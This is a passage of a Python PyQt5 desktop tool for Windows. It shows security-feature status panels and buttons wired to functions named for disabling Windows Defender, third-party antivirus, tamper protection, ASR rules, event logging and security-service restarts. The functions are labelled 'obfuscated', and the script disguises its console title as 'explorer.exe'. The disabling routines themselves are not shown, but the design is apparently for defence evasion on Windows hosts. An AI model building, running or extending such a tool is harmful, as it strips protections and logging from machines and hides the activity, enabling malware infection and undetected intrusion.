        lang_layout = QHBoxLayout()
        lang_layout.setContentsMargins(0,0,0,0)
        self.lang_group = QButtonGroup(self)
        self.en_button = QPushButton("English")
        self.en_button.setCheckable(True)
        self.en_button.clicked.connect(lambda: self.set_language("en"))
        self.lang_group.addButton(self.en_button)
        lang_layout.addWidget(self.en_button)
        self.vi_button = QPushButton("Tiếng Việt")
        self.vi_button.setCheckable(True)
        self.vi_button.clicked.connect(lambda: self.set_language("vi"))
        self.lang_group.addButton(self.vi_button)
        lang_layout.addWidget(self.vi_button)
        if self.current_language == "en": self.en_button.setChecked(True)
        else: self.vi_button.setChecked(True)
        left_layout.addLayout(lang_layout)

        self.about_button = QPushButton("ℹ️")
        self.about_button.setFixedSize(30, 30)
        self.about_button.setFont(QFont("Segoe UI", 12))
        self.about_button.clicked.connect(self.show_about_dialog)
        left_layout.addWidget(self.about_button, alignment=Qt.AlignRight)

        left_layout.addStretch()
        left_widget.setLayout(left_layout)

        right_widget = QWidget()
        right_layout = QVBoxLayout()
        right_layout.setContentsMargins(10, 10, 10, 10)

        status_group = QFrame()
        status_group.setObjectName("statusGroup")
        status_layout = QGridLayout(status_group)
        status_layout.setColumnStretch(1, 1)
        status_layout.setContentsMargins(5,5,5,5)

        self.status_labels = {}
        features = [
            ("feature_defender", get_defender_status),
            ("feature_firewall", get_firewall_status),
            ("feature_uac", get_uac_status),
            ("feature_smartscreen", get_smartscreen_status),
            ("feature_dep", get_dep_status),
            ("feature_cfg", get_cfg_status),
            ("feature_cfa", get_cfa_status),
            ("feature_np", get_network_protection_status),
            ("feature_asr", get_asr_status),
            ("feature_tamper", get_tamper_protection_status),
            ("feature_eventlog", get_event_logging_status)
        ]

        row = 0
        for feature_key, status_func in features:
            label_text = translations[self.current_language][feature_key] + ":"
            status_label = QLabel(label_text)
            status_label.setFont(QFont("Segoe UI", 10, QFont.Bold))
            status_label.setWordWrap(True)
            status_layout.addWidget(status_label, row, 0)

            value_label = QLabel("...")
            value_label.setFont(QFont("Segoe UI", 10))
            value_label.setFrameShape(QFrame.StyledPanel)
            value_label.setFrameShadow(QFrame.Sunken)
            value_label.setMinimumWidth(150)
            status_layout.addWidget(value_label, row, 1)

            self.status_labels[feature_key] = (status_label, value_label)
            row += 1

        # Refresh Button
        self.refresh_button = QPushButton(translations[self.current_language]["refresh_status"])
        self.refresh_button.setFont(QFont("Segoe UI", 10))
        self.refresh_button.clicked.connect(self.update_status_labels)
        self.refresh_button.setStyleSheet("""
            QPushButton {
                padding: 8px 16px;
                border-radius: 8px;
                background-color: #444;
                color: #eee;
                border: 1px solid #666;
            }
            QPushButton:hover {
                background-color: #555;
                border: 1px solid #777;
            }
            QPushButton:pressed {
                background-color: #666;
                border: 1px solid #888;
            }
        """)
        status_layout.addWidget(self.refresh_button, row, 0, 1, 2)
        status_layout.setRowStretch(row, 0)
        status_layout.setRowStretch(row + 1, 1)


        right_layout.addWidget(status_group)

        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        self.log_text.setFont(QFont("Segoe UI", 10))
        self.log_text.setMinimumHeight(150)
        right_layout.addWidget(self.log_text)

        right_widget.setLayout(right_layout)

        splitter = QSplitter(Qt.Horizontal)
        splitter.addWidget(left_widget)
        splitter.addWidget(right_widget)
        splitter.setStretchFactor(0, 0)
        splitter.setStretchFactor(1, 1)
        splitter.setSizes([280, 520])

        main_layout.addWidget(splitter)

        central_widget = QWidget()
        central_widget.setLayout(main_layout)
        self.setCentralWidget(central_widget)

        self.setStyleSheet("""
            #statusGroup {
                border: 1px solid #555;
                border-radius: 8px;
                padding: 10px;
            }
        """)

    def update_status_labels(self):
        features = {
            "feature_defender": get_defender_status,
            "feature_firewall": get_firewall_status,
            "feature_uac": get_uac_status,
            "feature_smartscreen": get_smartscreen_status,
            "feature_dep": get_dep_status,
            "feature_cfg": get_cfg_status,
            "feature_cfa": get_cfa_status,
            "feature_np": get_network_protection_status,
            "feature_asr": get_asr_status,
            "feature_tamper": get_tamper_protection_status,
            "feature_eventlog": get_event_logging_status,
        }

        for feature_key, status_func in features.items():
            status_text = status_func()
            label, value_label = self.status_labels[feature_key]

            value_label.setText(status_text)

            if status_text == translations[self.current_language]["status_active"]:
                value_label.setStyleSheet("color: #a4e472; background-color: #2a3800; border: 1px solid #a4e472;")
            elif status_text == translations[self.current_language]["status_inactive"]:
                value_label.setStyleSheet("color: #f5624e; background-color: #442222; border: 1px solid #f5624e;")
            else:
                value_label.setStyleSheet("color: #cccccc; background-color: #333333; border: 1px solid #666666;")

            label_text = translations[self.current_language][feature_key] + ":"
            label.setText(label_text)

        # Show and then hide the "Refresh Complete" message box
        msg_box = CustomMessageBox(translations[self.current_language]["window_title"], translations[self.current_language]["refresh_complete"], QMessageBox.Information, self)
        msg_box.show()  # Show the message box

        # Use a QTimer to close the message box after 2 seconds (2000 milliseconds)
        QTimer.singleShot(2000, msg_box.accept)


    def set_language(self, language_code):
        if language_code in translations:
            MainWindow.current_language = language_code
            self.setWindowTitle(translations[self.current_language]["window_title"])
            for text_key, button in self.buttons.items():
                button.setText(translations[self.current_language][text_key])
                button.setToolTip(translations[self.current_language][text_key])

            self.update_status_labels()
            self.refresh_button.setText(translations[self.current_language]["refresh_status"])


            for widget in QApplication.topLevelWidgets():
                if isinstance(widget, AboutDialog):
                    widget.setWindowTitle(translations[self.current_language]["about_title"])
                    for child in widget.children():
                        if isinstance(child, QLabel) and child.text() != "":
                            child.setText(translations[self.current_language]["about_text"])
                            break

    def show_about_dialog(self):
        about_dialog = AboutDialog(self)
        about_dialog.exec_()

    # --- Button Actions (using threads) ---

    def backup_registry(self):
        winsound.PlaySound("SystemExclamation", winsound.SND_ASYNC)
        worker = backup_registry(self)
        worker.signals.result.connect(self.backup_registry_result)
        worker.signals.error.connect(self.handle_thread_error)
        worker.signals.finished.connect(self.thread_finished)

    def backup_registry_result(self, result):
        success, message = result
        if success:
            self.log_message(translations[self.current_language]["backup_success"].format(message))
            CustomMessageBox(translations[self.current_language]["window_title"], translations[self.current_language]["backup_success"].format(message), QMessageBox.Information, self).exec_()
            winsound.PlaySound("SystemAsterisk", winsound.SND_ASYNC)
        else:
            CustomMessageBox(translations[self.current_language]["window_title"], translations[self.current_language]["backup_error"].format(message), QMessageBox.Critical, self).exec_()
            winsound.PlaySound("SystemHand", winsound.SND_ASYNC)

    def log_message(self, message, level=logging.INFO):
        self.log_text.append(message)
        logging.log(level, message)

    def restore_registry(self):
        winsound.PlaySound("SystemExclamation", winsound.SND_ASYNC)
        backup_file = os.path.join(BACKUP_DIR, "registry_backup_latest.reg")
        if os.path.exists(backup_file):
            worker = restore_registry(self, backup_file)
            worker.signals.result.connect(self.restore_registry_result)
            worker.signals.error.connect(self.handle_thread_error)
            worker.signals.finished.connect(self.thread_finished)
        else:
            self.log_message(translations[self.current_language]["no_backup"], logging.WARNING)
            CustomMessageBox(translations[self.current_language]["window_title"], translations[self.current_language]["no_backup"], QMessageBox.Warning, self).exec_()
            winsound.PlaySound("SystemExclamation", winsound.SND_ASYNC)

    def restore_registry_result(self, success):
        if success:
            self.log_message(translations[self.current_language]["restore_success"])
            CustomMessageBox(translations[self.current_language]["window_title"], translations[self.current_language]["restore_success"], QMessageBox.Information, self).exec_()
            winsound.PlaySound("SystemAsterisk", winsound.SND_ASYNC)
        else:
            winsound.PlaySound("SystemHand", winsound.SND_ASYNC)

    def call_disable_windows_security(self):
        winsound.PlaySound("SystemExclamation", winsound.SND_ASYNC)
        worker = disable_windows_security_obfuscated(self)
        worker.signals.result.connect(lambda result: self.disable_security_result(result))
        worker.signals.error.connect(self.handle_thread_error)
        worker.signals.finished.connect(self.thread_finished)

    def disable_security_result(self, success):
        if success:
            self.log_message(translations[self.current_language]["disable_security_success"])
            CustomMessageBox(translations[self.current_language]["window_title"], translations[self.current_language]["disable_security_success"], QMessageBox.Information, self).exec_()
            winsound.PlaySound("SystemAsterisk", winsound.SND_ASYNC)
        else:
            winsound.PlaySound("SystemHand", winsound.SND_ASYNC)
        self.update_status_labels()

    def call_disable_antivirus(self):
        winsound.PlaySound("SystemExclamation", winsound.SND_ASYNC)
        # Pass self (the MainWindow instance) to the worker
        worker = disable_third_party_antivirus_obfuscated(self, self)
        worker.signals.result.connect(self.disable_antivirus_result)  # Connect to result signal
        worker.signals.error.connect(self.handle_thread_error)
        worker.signals.finished.connect(self.thread_finished)
        worker.signals.finished.connect(self.update_status_labels)


    def disable_antivirus_result(self, success):
        if success:
            self.log_message(translations[self.current_language]["disable_antivirus_success"])
            CustomMessageBox(translations[self.current_language]["window_title"], translations[self.current_language]["disable_antivirus_success"], QMessageBox.Information, self).exec_()
            winsound.PlaySound("SystemAsterisk", winsound.SND_ASYNC)
        else:
            self.log_message(translations[self.current_language]["disable_antivirus_error"])
            CustomMessageBox(translations[self.current_language]["window_title"], translations[self.current_language]["disable_antivirus_error"], QMessageBox.Critical, self).exec_()
            winsound.PlaySound("SystemHand", winsound.SND_ASYNC)
        # self.update_status_labels() # Already updating on finished signal


    def call_prevent_services(self):
        winsound.PlaySound("SystemExclamation", winsound.SND_ASYNC)
        worker = prevent_security_service_restarts_obfuscated(self)
        worker.signals.error.connect(self.handle_thread_error)
        worker.signals.finished.connect(self.thread_finished)
        worker.signals.finished.connect(self.update_status_labels)

    def call_disable_windows_features(self):
        winsound.PlaySound("SystemExclamation", winsound.SND_ASYNC)
        worker = disable_windows_features_obfuscated(self)
        worker.signals.result.connect(lambda result: self.disable_features_result(result))
        worker.signals.error.connect(self.handle_thread_error)
        worker.signals.finished.connect(self.thread_finished)


    def disable_features_result(self, success):
        if success:
            self.log_message(translations[self.current_language]["disable_features_success"])
            CustomMessageBox(translations[self.current_language]["window_title"], translations[self.current_language]["disable_features_success"], QMessageBox.Information, self).exec_()
            winsound.PlaySound("SystemAsterisk", winsound.SND_ASYNC)
        else:
            winsound.PlaySound("SystemHand", winsound.SND_ASYNC)
        self.update_status_labels()

    def call_disable_all(self):
        winsound.PlaySound("SystemExclamation", winsound.SND_ASYNC)
        reply = QMessageBox.question(self, translations[self.current_language]["window_title"],
                                     translations[self.current_language]["disable_all_confirm"],
                                     QMessageBox.Yes | QMessageBox.No, QMessageBox.No)

        if reply == QMessageBox.Yes:
            winsound.PlaySound("SystemExclamation", winsound.SND_ASYNC)

            workers = [
                disable_windows_security_obfuscated(self),
                disable_third_party_antivirus_obfuscated(self, self), # Pass main_window here
                prevent_security_service_restarts_obfuscated(self),
                disable_windows_features_obfuscated(self),
                disable_event_logging(self),
                disable_tamper_protection(self),
                disable_asr_rules(self)
            ]

            for worker in workers:
                worker.signals.error.connect(self.handle_thread_error)
                worker.signals.finished.connect(self.thread_finished)

            workers[-1].signals.finished.connect(self.update_status_labels)
            workers[-1].signals.finished.connect(lambda: self.log_message(translations[self.current_language]["disable_all_success"]))
            workers[-1].signals.finished.connect(lambda: CustomMessageBox(translations[self.current_language]["window_title"], translations[self.current_language]["disable_all_success"], QMessageBox.Information, self).exec_())
            workers[-1].signals.finished.connect(lambda: winsound.PlaySound("SystemAsterisk", winsound.SND_ASYNC))

    def handle_thread_error(self, error_message):
        self.log_message(error_message, logging.ERROR)
        CustomMessageBox(translations[self.current_language]["window_title"], error_message, QMessageBox.Critical, self).exec_()
        winsound.PlaySound("SystemHand", winsound.SND_ASYNC)

    def thread_finished(self):
        pass

# --- Main Application Execution ---

if __name__ == "__main__":
    setup_logging()
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(decode_string(encode_string("explorer.exe")))
    except:
        pass
    if not is_admin():
        app = QApplication(sys.argv)
        app.setStyle("Fusion")
        logging.error("This script requires administrator privileges.")
        CustomMessageBox("Error", "This script must be run as an administrator.", QMessageBox.Critical).exec_()
        sys.exit(1)
    app = QApplication(sys.argv)
    app.setStyleSheet(qdarkstyle.load_stylesheet(qt_api='pyqt5', palette=qdarkstyle.DarkPalette))
    app.setFont(QFont("Segoe UI", 10))
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
